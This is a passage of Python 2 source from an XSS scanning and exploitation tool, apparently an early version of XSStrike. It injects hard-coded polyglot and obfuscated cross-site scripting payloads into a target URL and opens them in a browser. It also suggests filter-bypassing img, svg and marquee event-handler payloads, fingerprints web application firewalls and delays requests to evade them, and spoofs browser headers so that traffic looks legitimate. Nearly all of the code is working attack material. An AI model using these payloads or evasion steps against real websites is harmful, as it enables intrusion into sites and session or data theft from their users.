        param_data[item.split('=',1)[0]] = item.split('=',1)[1]
    return param_data
def showOutput(URL, result):
    """
        :Description: This function prints the result of the bypasser() function in a nice fashion.
        :type:  Type of the fuzzing strings that were sent
        :result: Contains the sent Fuzz, Request Status and the response's output
        :note: This function prints the output.
    """
    table = PrettyTable(['Fuzz', 'Request Status', 'Working'])
    for value in result:
        if (value['httpCode'] != 'Success'):
            table.add_row([value['fuzz'], value['httpCode'], '\033[1;31mNo\033[1;m'])
        else:
            if(value['expected'] in value['output']): 
                table.add_row([value['fuzz'], value['httpCode'], '\033[1;32mYes\033[1;m'])
                if value['Type'] == "payload_url":
                    url_based.append(value['output'])
                if value['Type'] == "payload_error":
                    error_based.append(value['output'])
                if value['Type'] == "payload_popup":
                    popup_based.append(value['output'])
                if value['Type'] == "popup":
                    popup.append(value['output'])
                if value['Type'] == "fuzz":
                    fuzzed.append(value['output'])
                else:
                    pass
            else: 
                table.add_row([value['fuzz'], value['httpCode'], '\033[1;33mFiltered\033[1;m'])
                if value['Type'] == "payload_url":
                    f_url_based.append(value['output'])
                if value['Type'] == "payload_error":
                    f_error_based.append(value['output'])
                if value['Type'] == "payload_popup":
                    f_popup_based.append(value['output'])
                else:
                    pass
    print table
    jarvis()

def jarvis():
    if len(popup) == 0:
        print '\n\033[1;31m[-]\033[1;m No suitable payload found'
        quit()
    if "<r sRc=x oNError=r>" in fuzzed:
        print Style.BRIGHT + Fore.GREEN + "<iMg sRc=x oNErRor="+random.choice(popup)+">"
    if len(url_based) > 0:
        print Style.BRIGHT + Fore.GREEN + "<obJect daTa=//14.rs>\n<emBeD sRc=javascript:"+random.choice(popup)+">"
    if len(error_based) > 0:
        print Style.BRIGHT + Fore.GREEN + "<iMg sRc=x oNerRor="+random.choice(popup)+">"
    if len(popup_based) > 0:
        if '<MaRquEE oNStArt=y>' in popup_based:
            print Style.BRIGHT + Fore.GREEN + "<MaRquEE oNStArt="+random.choice(popup)+">"
        if '<sVg oNloAd=y>' in popup_based:
            print Style.BRIGHT + Fore.GREEN + "<sVg oNloAd="+random.choice(popup)+">"
        if '<vIdeO oNloAd=y>' in popup_based:
            print Style.BRIGHT + Fore.GREEN + "<vIdeO oNloAd="+random.choice(popup)+">"

#Jarvis is under developement so I commenting out this part.
#I released this incomplete code because I want you to contribute.
    #if len(f_url_based) > 0:
    #    print Style.BRIGHT + Fore.GREEN + "&lt;obJect daTa=//14.rs&gt;"
    #if len(f_popup_based) > 0:
    #    print Style.BRIGHT + Fore.GREEN + "&lt;MarQuee="+random.choice(popup)+"&gt;"
    #if len(f_error_based) > 0:
    #    print Style.BRIGHT + Fore.GREEN + "&lt;iMg sRc=x oNerRor="+random.choice(popup)+"&gt;"
    quit()

def insertFuzz(URL, fuzz):
    """
        :Description: This function inserts the Fuzz as GET Parameter in the URL
        :URL: Target URL
        :fuzz: Fuzzing string
        :return: The URL with a concatenated string consisting of a random string and the fuzz.
        :note: Some fuzzing symbols can be part of a normal response. In order to distinctly find the fuzz that was sent, a random string is added before the fuzz.
    """
    fuzz = urllib.quote_plus(fuzz) #url encoding
    randomString = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(6))
    return randomString, URL.replace('d3v', randomString + str(fuzz))
 
def setParams(param_data, fuzz):
    """
        :Description: This function sets the Fuzz in the POST Parameter.
        :url: Target URL
        :fuzz: Fuzzing string
        :return: The post parameter with a concatenated string consisting of a random string and the fuzz
        :note: Some fuzzing symbols can be part of a normal response. In order to distinctly find the fuzz that was sent, a random string is added before the fuzz.
    """    
    randomString = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(6))
    parameter = copy.deepcopy(param_data) #makes a deep copy. this is needed because using a reference does not work
    for param in parameter:
        if parameter[param] == 'd3v':
            parameter[param] = randomString + str(fuzz)
    return randomString, parameter;
#######################################################
#       HULK
#######################################################
def hulk():
    print "\033[1;33m[!]\033[1;m Payload 1. Shut 'em up"
    shut = URL.replace("d3v", "</script>';,'\"/><sVg/oNLoad=prompt``>")
    webbrowser.open(shut)
    work = raw_input("\033[1;34m[?]\033[1;m Press enter to execute next payload")
    print "\033[1;33m[!]\033[1;m Payload 2. Brutus"
    brutus = URL.replace("d3v", "'\">jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e")
    webbrowser.open(brutus)
    work = raw_input("\033[1;34m[?]\033[1;m Press enter to execute next payload")
    print "\033[1;33m[!]\033[1;m Payload 3. Counter"
    counter = URL.replace("d3v", "\"';</script>\">'><SCrIPT>alert(String.fromCharCode(88,83,83))</scRipt>")
    webbrowser.open(counter)
    work = raw_input("\033[1;34m[?]\033[1;m Press enter to execute next payload")
    print "\033[1;33m[!]\033[1;m Payload 4. Evil Frame"
    frame = URL.replace("d3v", "\"><iframe+srcdoc%3D\"%26lt%3Bimg+src%26equals%3Bx%3Ax+onerror%26equals%3Balert%26lpar%3B1%26rpar%3B%26gt%3B\">")
    webbrowser.open(frame)
    work = raw_input("\033[1;34m[?]\033[1;m Press enter to execute next payload")
    print "\033[1;33m[!]\033[1;m Payload 5. Marquee Magic"
    magic = URL.replace("d3v", "'\"><mArQuEe oNStart=confirm``>")
    webbrowser.open(magic)
    work = raw_input("\033[1;34m[?]\033[1;m Press enter to execute next payload")
    print "\033[1;33m[!]\033[1;m Payload 6. Cloak"
    cloak = URL.replace("d3v", "%3c%69%4d%67%20%73%52%63%3d%78%3a%61%6c%65%72%74%60%60%20%6f%4e%45%72%72%6f%72%3d%65%76%61%6c%28%73%72%63%29%3e")
    webbrowser.open(cloak)
    print "\033[1;33m[!]\033[1;m Hulk's stamina is over. Exiting..."
    quit()

###########################################
#       WAF Detector
###########################################
def WAF_detector():
    noise = "<script>alert()</script>" #a payload which is noisy enough to provoke the WAF
    fuzz = URL.replace("d3v", noise) #Replaces "d3v" in url with noise
    res1 = urlopen(fuzz) #Opens the noise injected payload
    if res1.code == 406 or res1.code == 501: #if the http response code is 406/501
        print"\033[1;31m[-]\033[1;m WAF Detected : Mod_Security"
        print "\033[1;33m[!]\033[1;m Delaying requests to avoid WAF detection\n"
        WAF = "True" #A WAF is present
        waf_choice()
    elif res1.code == 999: #if the http response code is 999
        print"\033[1;31m[-]\033[1;m WAF Detected : WebKnight"
        print "\033[1;33m[!]\033[1;m Delaying requests to avoid WAF detection\n"
        WAF = "True"
        waf_choice()
    elif res1.code == 419: #if the http response code is 419
        print"\033[1;31m[-]\033[1;m WAF Detected : F5 BIG IP"
        print "\033[1;33m[!]\033[1;m Delaying requests to avoid WAF detection\n"
        WAF = "True"
        waf_choice()
    elif res1.code == 403: #if the http response code is 403
        print "\033[1;31m[-]\033[1;m Unknown WAF Detected"
        print "\033[1;33m[!]\033[1;m Delaying requests to avoid WAF detection\n"
        WAF = "True"
        waf_choice()
    elif res1.code == 302: #if redirection is enabled
        print "\033[1;31m[-]\033[1;m Redirection Detected! Exploitation attempts may fail.\n"
        choice()
    else:
        print "\033[1;32m[+]\033[1;m WAF Status: Offline\n"
        WAF = "False" #No WAF is present
        choice()

###########################################
#       Menus
###########################################
def choice(): #Activated if there is no WAF and target uses POST method
    print"\n\033[97m1.\033[1;m Fuzzer"
    print"\033[97m2.\033[1;m Striker"
    print"\033[97m3.\033[1;m Spider"
    print"\033[97m4.\033[1;m Ninja"
    print"\033[97m5.\033[1;m Hulk"
    choice = input("\033[97mEnter your choice: \033[1;m")
    if choice == 1:
        print "\033[1;31m--------------------------------------------\033[1;m"
        fuzzer()
    if choice == 2:
        print "\033[1;31m--------------------------------------------\033[1;m"
        striker()
    if choice == 3:
        print "\033[1;31m--------------------------------------------\033[1;m"
        firstDomains = []
        firstDomains = initial_crawling(firstDomains)
        findxss(firstDomains)
    if choice == 4:
        print "\033[1;31m--------------------------------------------\033[1;m"
        fuzz = getFuzz(type) #Gets type of fuzz to be sent from the database i.e. XSS
        bypasser(type, fuzz, URL) #Launches bypasser aka Ninja
    if choice == 5:
        print "\033[1;31m--------------------------------------------\033[1;m"
        hulk()
def post_choice(): #Activated if the target uses POST method
    print "\033[97m1.\033[1;m Striker"
    print "\033[97m2.\033[1;m Ninja"
    choice = input("\033[97mEnter your choice: \033[1;m")
    if choice == 1:
        print "\033[1;31m--------------------------------------------\033[1;m"
        POST()
    if choice == 2:
        print "\033[1;31m--------------------------------------------\033[1;m"
        global param_data
        param_data = extractParams(param_data) #Sending POST data to a module which can arrange them
        fuzz = getFuzz(type) #Gets type of fuzz to be sent from the database i.e. XSS
        bypasser(type, fuzz, URL) #Launches bypasser aka Ninja
def waf_choice():
    print "\033[97m1.\033[1;m Striker"
    print "\033[97m2.\033[1;m Ninja"
    choice = input("\033[97mEnter your choice: \033[1;m")
    if choice == 1:
        print "\033[1;31m--------------------------------------------\033[1;m"
        striker()
    if choice == 2:
        print "\033[1;31m--------------------------------------------\033[1;m"
        fuzz = getFuzz(type) #Gets the described type of fuzz i.e. XSS
        bypasser(type, fuzz, URL) #Opens bypasser

###########################################################################################
#   Prints banner, help, gets input and other things a core function is supposed to do :p
###########################################################################################
print "        \033[1;32mMade with \033[1;31m<3\033[1;32m by Somdev Sangwan : TeamUltimate.in\033[1;m"
print"""\033[1;31m _     _ _______ _______ _______  ______ _____ _     _ _______
  \___/  |______ |______    |    |_____/   |   |____/  |______
 _/   \_ ______| ______|    |    |    \_ __|__ |    \_ |______"""
print"\t\033[1;32m       Enter \"help\" to access help manual\033[1;m"
print"\033[1;31m-----------------------------------------------------------------\033[1;m"
URL = raw_input('\033[1;34m[?]\033[1;m\033[1;97m Enter the target URL: \033[1;m')
if URL == "help": #If the input is "help", prints helk
    print """\033[1;31m--------------------------------------------\033[1;m
\033[1;33m[!]\033[1;m Information  \033[1;34m[?]\033[1;m Prompt  \033[1;31m[-]\033[1;m Bad News  \033[1;32m[+]\033[1;m Good News  \033[1;97m[>]\033[1;m Processing
\n\033[1;100mFuzzer\033[1;m Checks where and how the input gets reflected and then tries to build a payload according to that.
\n\033[1;100mStriker\033[1;m Brute forces all the parameters one by one and opens the POC in a browser window.
\n\033[1;100mSpider\033[1;m Finds all links present in the homepage of the target and checks XSS.
\n\033[1;100mNinja\033[1;m It can reverse engineer rules of filters/WAFs and can suggest payloads.
\n\033[1;100mHulk\033[1;m Injects polyglots and handpicked payloads into the selected parameter and opens the POC in a browser window.
\n\033[1;33mNote:\033[1;m Some payloads use JavaScript event handlers like onclick, onfocus etc. so you may need to check them manually.
If there are multiple parameters and Striker gives false positive then enter the payload manually into the vulnerable parameter.
\033[1;31m--------------------------------------------\033[1;m"""
    quit()
if 'https://' in URL:
    pass
elif 'http://' in URL:
    pass
else:
    URL = "http://" + URL
cookie = raw_input('\033[1;34m[?]\033[1;m\033[1;97m Enter cookie (if any): \033[1;m')
if "=" not in URL: #if = is not present in URL it means it uses POST requests
    print "\033[1;33m[!]\033[1;m The URL you entered seems to use POST Method."
    param_data = str(raw_input("\033[1;34m[?]\033[1;m\033[1;97m Enter post data: \033[1;m"))
    if "d3v" not in param_data: #D3V is required to specify an injection point for Ninja
        print Style.BRIGHT + Fore.RED + "[-] You have to insert \"d3v\" in the most crucial parameter to use Fuzzer and Hulk.\nFor example: website.com/search.php?q=d3v&category=1"
        quit()
    else:
        post_choice() #Printing menu items which supports POST method
elif "d3v" not in URL: #d3v must be present in URL so fuzzer, hulk and ninja can deal with reflections
    print Style.BRIGHT + Fore.RED + "[-] You have to insert \"d3v\" in the most crucial parameter to use Fuzzer and Hulk.\nFor example: website.com/search.php?q=d3v&category=1"
    quit()
try:
    param_data = None #It is confirmed that GET method is in use so setting POST data to None
    WAF_detector() #Launches WAF detector :p
#Handling errors
except(IOError):
    print Style.BRIGHT + Fore.RED + "\n[-] There's some problem with the URL. Exiting..."
    quit()
#Headers to make every request look legitmate
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
('Referer', URL), ('Accept-Encoding', 'gzip, deflate'), ('Cookie', cookie),
('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')]
